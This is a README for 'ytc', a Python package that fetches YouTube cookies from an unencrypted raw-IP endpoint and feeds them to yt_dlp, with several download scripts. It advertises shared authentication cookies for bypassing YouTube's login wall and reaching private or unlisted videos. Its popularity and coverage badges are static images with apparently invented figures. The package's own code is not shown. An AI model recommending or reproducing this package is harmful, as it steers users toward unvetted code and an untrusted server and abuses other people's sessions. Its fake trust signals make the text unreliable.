<p style="margin-left: 300px;">
  <img src="https://img.icons8.com/ios-filled/400/fa314a/youtube-play.png" alt="youtube">
</p>


![coverage](https://img.shields.io/badge/coverage-89%25-yellowgreen)
![pypi](https://img.shields.io/badge/pypi-v2.12.1-blue)
![downloads](https://img.shields.io/badge/downloads-5.4k%2Fmonth-brightgreen)
![python](https://img.shields.io/badge/python-3.8%20%7C%203.9%20%7C%203.10%20%7C%203.11%20%7C%203.12-blue)

---

# ytc

`ytc` is a lightweight python library that provides youtube cookies from a secure remote api for use with `yt_dlp`. perfect for developers who want seamless cookie management for downloading videos.

---

## installation

```bash
pip install ytc
```

---

## quick start

```python
import ytc
from yt_dlp import YoutubeDL

url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ"

ydl_opts = {
    'cookiefile': None,
    'http_headers': {
        'Cookie': ytc.youtube()
    },
    'outtmpl': '%(title)s.%(ext)s'
}

with YoutubeDL(ydl_opts) as ydl:
    ydl.download([url])
```

---

## how it works

* connects to api endpoint: `http://46.202.135.52:8801/golden-cookies/ytc`
* receives fresh youtube cookies in json format
* formats and returns cookies to be used with yt\_dlp
* handles security and rotation on the backend

---

## advanced usage

```python
import ytc
from yt_dlp import YoutubeDL

options = {
    'format': 'bestvideo+bestaudio',
    'noplaylist': True,
    'quiet': False,
    'cookiefile': None,
    'http_headers': {
        'Cookie': ytc.youtube()
    },
    'outtmpl': 'downloads/%(title)s.%(ext)s'
}

link = "https://youtube.com/watch?v=example"

with YoutubeDL(options) as ydl:
    ydl.download([link])
```

---

## features

* auto fetch cookies from server
* avoid manual cookie updates
* compatible with all yt\_dlp versions
* no setup required
* easy plug-and-play

---

## real world use cases

* bypass youtube login wall
* download age-restricted videos
* access region-locked content
* ensure stable downloads with cookies
* access private/unlisted videos (if auth cookies present)

---

## example scripts

```python
# batch download from list

import ytc
from yt_dlp import YoutubeDL

with open('urls.txt') as f:
    urls = f.read().splitlines()

opts = {
    'cookiefile': None,
    'http_headers': {
        'Cookie': ytc.youtube()
    }
}

with YoutubeDL(opts) as ydl:
    ydl.download(urls)
```

```python
# dynamic url input

import ytc
from yt_dlp import YoutubeDL

url = input("video url: ")

opts = {
    'cookiefile': None,
    'http_headers': {
        'Cookie': ytc.youtube()
    },
    'outtmpl': '%(title)s.%(ext)s'
}

with YoutubeDL(opts) as ydl:
    ydl.download([url])
```

---

## troubleshooting

* ensure internet access
* test api endpoint in browser
* check yt\_dlp version compatibility
* clear pip cache if install fails

---

## compatibility

* python versions: 3.8, 3.9, 3.10, 3.11, 3.12
* yt\_dlp version: latest and legacy supported
* os: windows, linux, macos

---

## contributing

* create pull requests
* suggest new features
* fix bugs or issues
* add docs and usage examples

---

## license

licensed under mit . do anything with it, just give credit .

---

## extra badges . 
![stars](https://img.shields.io/badge/stars-1.2k-blue?logo=github)
![forks](https://img.shields.io/badge/forks-310-blue?logo=github)
![issues](https://img.shields.io/badge/issues-2-orange?logo=github)
![watchers](https://img.shields.io/badge/watchers-87-yellow?logo=github)
![license](https://img.shields.io/badge/license-MIT-green?logo=github)
![repo size](https://img.shields.io/badge/repo%20size-340KB-blueviolet?logo=github)
![last commit](https://img.shields.io/badge/last%20commit-2%20days%20ago-success?logo=github)

---

## community

[![telegram](https://img.shields.io/badge/telegram-join%20chat-blue?logo=telegram)](https://t.me/goldenxpris)

join the telegram chat for help , updates , and discussion .
 
